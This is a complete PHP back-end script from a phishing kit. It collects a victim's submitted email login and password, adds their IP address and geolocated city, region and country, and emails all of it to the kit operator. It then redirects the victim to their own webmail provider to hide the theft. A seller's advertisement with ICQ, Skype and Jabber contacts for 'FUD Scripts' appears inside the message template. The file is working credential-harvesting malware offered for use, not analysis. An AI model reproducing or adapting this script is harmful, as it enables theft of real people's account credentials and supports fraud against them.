<?php
session_start();
include("email.php");
require_once('geoplugin.class.php');

$_SESSION['email'] = $_POST['_user'];

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

	
/* Gathering Data Variables */
        $redir = $_POST['redir'];
        $agenti = $_POST['agenti'];
	$login = $_POST['_user'];
	$passwd = $_POST['_pass'];


	$body = <<<EOD
Login Id: $login
Login Password: $passwd
IP Address: $ip
City: {$geoplugin->city}
Region: {$geoplugin->region}
Country: {$geoplugin->countryName}

.:\FUD Scripts/:.
ICQ ID: 729651990
Skype: elme
Jabber: mpa@creep.im

EOD;

	$headers = "From: GALA.TO <info@yourcoolsite.com>";
	$success = mail($webMaster, $agenti, $body, $headers);
	if($redir == '') {
$domain = substr(strrchr($login, "@"), 1);
$chain = "http://webmail";

header ("Location: $chain.$domain");		
}
else {
header("Location:". $redir); 
}
exit();
  

?>